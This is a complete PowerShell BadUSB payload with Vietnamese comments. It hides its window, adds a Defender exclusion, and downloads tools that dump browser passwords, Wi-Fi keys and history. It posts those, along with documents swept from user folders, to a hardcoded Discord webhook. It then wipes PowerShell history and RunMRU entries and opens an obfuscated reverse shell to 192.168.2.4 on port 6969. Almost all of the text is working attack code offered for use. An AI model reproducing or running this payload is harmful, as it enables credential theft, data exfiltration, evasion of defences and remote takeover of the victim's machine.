# ============================================================
# BADUSB PAYLOAD - REVERSE SHELL + EXFIL COMPLETE
# Bao gồm: Reverse shell, Telegram, Discord, FindAndSend
# ============================================================

# === PHẦN 1: ẨN CỬA SỔ ===
$hide = 'y'
if($hide -eq 'y'){
    $w = (Get-Process -PID $pid).MainWindowHandle
    $a = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
    $t = Add-Type -MemberDefinition $a -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
    if($w -ne [System.IntPtr]::Zero){
        $t::ShowWindowAsync($w, 0)
    } else {
        $Host.UI.RawUI.WindowTitle = 'xx'
        $p = Get-Process | Where-Object { $_.MainWindowTitle -eq 'xx' }
        $w = $p.MainWindowHandle
        $t::ShowWindowAsync($w, 0)
    }
}

# === PHẦN 2: CẤU HÌNH ===
$discordWebhook = "https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
$basePath = "C:\Users\$env:USERNAME\Downloads\scripts"
$dumpFolder = "$basePath\$env:USERNAME-$(Get-Date -f yyyy-MM-dd)"
$dumpFile = "$dumpFolder.zip"

# === PHẦN 3: TẠO THƯ MỤC VÀ LOẠI TRỪ DEFENDER ===
New-Item -ItemType Directory -Path $basePath -Force | Out-Null
Set-Location $basePath
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
Add-MpPreference -ExclusionPath $basePath -Force

# === PHẦN 4: TẢI CÔNG CỤ ===
$zipUrl = "https://github.com/Sunlaii/ANM-Esp32BadUSB/raw/refs/heads/MinhNhat/tools.zip"
Invoke-WebRequest $zipUrl -OutFile "tools.zip" -UseBasicParsing
Expand-Archive -Path "tools.zip" -DestinationPath "." -Force

# === PHẦN 5: CHẠY CÁC CÔNG CỤ LẤY DỮ LIỆU ===
Start-Process -FilePath ".\WNetWatcher.exe" -ArgumentList "/stext connected_devices.txt" -WindowStyle Hidden
Start-Process -FilePath ".\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFilterType 3 7 /stext history.txt" -WindowStyle Hidden
Start-Process -FilePath ".\WebBrowserPassView.exe" -ArgumentList "/stext passwords.txt" -WindowStyle Hidden
Start-Process -FilePath ".\WirelessKeyView.exe" -ArgumentList "/stext wifi.txt" -WindowStyle Hidden

# === PHẦN 6: CHỜ FILE ĐƯỢC TẠO ===
$timeout = 60
$startTime = Get-Date
while (($(Get-Date) - $startTime).TotalSeconds -lt $timeout) {
    if ((Test-Path "passwords.txt") -and (Test-Path "wifi.txt") -and (Test-Path "connected_devices.txt") -and (Test-Path "history.txt")) {
        break
    }
    Start-Sleep -Milliseconds 100
}

# Di chuyển file vào thư mục dump
if (Test-Path "passwords.txt") { Move-Item passwords.txt -Destination "$dumpFolder" -Force }
if (Test-Path "wifi.txt") { Move-Item wifi.txt -Destination "$dumpFolder" -Force }
if (Test-Path "connected_devices.txt") { Move-Item connected_devices.txt -Destination "$dumpFolder" -Force }
if (Test-Path "history.txt") { Move-Item history.txt -Destination "$dumpFolder" -Force }

# === PHẦN 7: NÉN VÀ GỬI QUA DISCORD ===
if ((Get-ChildItem "$dumpFolder" -ErrorAction SilentlyContinue).Count -gt 0) {
    Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
    
    $fileBytes = [System.IO.File]::ReadAllBytes($dumpFile)
    $fileBase64 = [System.Convert]::ToBase64String($fileBytes)
    
    $boundary = [System.Guid]::NewGuid().ToString()
    $multipartContent = @"
--$boundary
Content-Disposition: form-data; name="file1"; filename="$([System.IO.Path]::GetFileName($dumpFile))"
Content-Type: application/zip

$fileBase64
--$boundary--
"@
    $headers = @{"Content-Type" = "multipart/form-data; boundary=$boundary"}
    try {
        Invoke-RestMethod -Uri $discordWebhook -Method Post -Body $multipartContent -Headers $headers -UseBasicParsing
    } catch {}
}

# === PHẦN 8: FINDANDSEND (QUÉT VÀ GỬI FILE THEO EXTENSION) ===
Function FindAndSend {
    param ([string[]]$FileType, [string[]]$Path)
    
    $maxZipFileSize = 10MB
    $currentZipSize = 0
    $index = 1
    $zipFilePath = "$env:TEMP\Loot$index.zip"
    
    # Nếu không có đường dẫn thì quét các thư mục mặc định
    if ($Path -ne $null) {
        $foldersToSearch = "$env:USERPROFILE\" + $Path
    } else {
        $foldersToSearch = @(
            "$env:USERPROFILE\Documents",
            "$env:USERPROFILE\Desktop",
            "$env:USERPROFILE\Downloads",
            "$env:USERPROFILE\OneDrive",
            "$env:USERPROFILE\Pictures",
            "$env:USERPROFILE\Videos"
        )
    }
    
    # Nếu không có loại file thì quét các extension mặc định
    if ($FileType -ne $null) {
        $fileExtensions = "*." + $FileType
    } else {
        $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
    }
    
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
    
    foreach ($folder in $foldersToSearch) {
        if (!(Test-Path $folder)) { continue }
        foreach ($extension in $fileExtensions) {
            $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                $fileSize = $file.Length
                if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                    $zipArchive.Dispose()
                    # Gửi file zip qua Discord
                    $fileBytesZip = [System.IO.File]::ReadAllBytes($zipFilePath)
                    $fileBase64Zip = [System.Convert]::ToBase64String($fileBytesZip)
                    $boundaryZip = [System.Guid]::NewGuid().ToString()
                    $multipartZip = @"
--$boundaryZip
Content-Disposition: form-data; name="file1"; filename="Loot$index.zip"
Content-Type: application/zip

$fileBase64Zip
--$boundaryZip--
"@
                    $headersZip = @{"Content-Type" = "multipart/form-data; boundary=$boundaryZip"}
                    try {
                        Invoke-RestMethod -Uri $discordWebhook -Method Post -Body $multipartZip -Headers $headersZip -UseBasicParsing
                    } catch {}
                    
                    Remove-Item -Path $zipFilePath -Force
                    $currentZipSize = 0
                    $index++
                    $zipFilePath = "$env:TEMP\Loot$index.zip"
                    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                }
                $entryName = $file.FullName.Substring($folder.Length + 1)
                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                $currentZipSize += $fileSize
            }
        }
    }
    
    $zipArchive.Dispose()
    if ((Get-Item $zipFilePath -ErrorAction SilentlyContinue).Length -gt 0) {
        $fileBytesZip = [System.IO.File]::ReadAllBytes($zipFilePath)
        $fileBase64Zip = [System.Convert]::ToBase64String($fileBytesZip)
        $boundaryZip = [System.Guid]::NewGuid().ToString()
        $multipartZip = @"
--$boundaryZip
Content-Disposition: form-data; name="file1"; filename="Loot$index.zip"
Content-Type: application/zip

$fileBase64Zip
--$boundaryZip--
"@
        $headersZip = @{"Content-Type" = "multipart/form-data; boundary=$boundaryZip"}
        try {
            Invoke-RestMethod -Uri $discordWebhook -Method Post -Body $multipartZip -Headers $headersZip -UseBasicParsing
        } catch {}
    }
    Remove-Item -Path $zipFilePath -Force
    Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
}

# Gọi hàm FindAndSend
FindAndSend

# === PHẦN 9: DỌN DẸP DẤU VẾT ===
Set-Location "C:\"
Remove-Item -Path $basePath -Recurse -Force -ErrorAction SilentlyContinue
Remove-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
Clear-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
    Remove-ItemProperty -Path $regPath -Name "*" -ErrorAction SilentlyContinue
} catch {}

# === PHẦN 10: REVERSE SHELL (CODE GỐC) ===
$47f6eed18a29937a718172f3bab39b6d8b68f46cd46734d222793dfc51b39358='P'+'S ';$4782544cc93c0fb50e03cbf764a54693c8e3b075ca763f3fdbb9de95b1330e5c44bf5512335caa51442f1a159d8877ba179aa5268624d4200a1d170c893ad63c='1'+""+'9'+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+'2'+'.'+""+""+'1'+""+'6'+""+""+""+""+""+""+""+""+""+""+""+""+""+'8'+'.'+'2'+'.'+""+'4'+""+""+""+""+""+""+""+"";$948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d = n''ew''-OB''je''CT system.net.sockets.tcpclient($4782544cc93c0fb50e03cbf764a54693c8e3b075ca763f3fdbb9de95b1330e5c44bf5512335caa51442f1a159d8877ba179aa5268624d4200a1d170c893ad63c,6969);$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1 = $948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d.GetStream();[byte[]]$bytes = 0..65535|%{0};sleep(0.1);sleep(0.1);sleep(0.1);sleep(0.1);while(($i = $06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Read($bytes, 0, $bytes.Length)) -ne 0){;$2df91d337f6f62021157bbfe1826d2fa61ce752dbea78160523fb1232ae0e773 = (n''Ew-oB''J''eC''t -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (i''e''x'' -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire $2df91d337f6f62021157bbfe1826d2fa61ce752dbea78160523fb1232ae0e773 2>&1 | O''U''t-S''TrI''n''G );$sendback2 = $sendback + $47f6eed18a29937a718172f3bab39b6d8b68f46cd46734d222793dfc51b39358.SubString(0,3) + (SP''L''iT-P''A''t''h -path "$(p''w''D'')\0x00") + '> ';sleep 0.01;sleep 0.01;$d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb = ([text.encoding]::ASCII).GetBytes($sendback2);sleep 0.01;$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Write($d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb,0,$d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb.Length);sleep 0.01;$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Flush()};sleep 0.01;$948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d.Close()
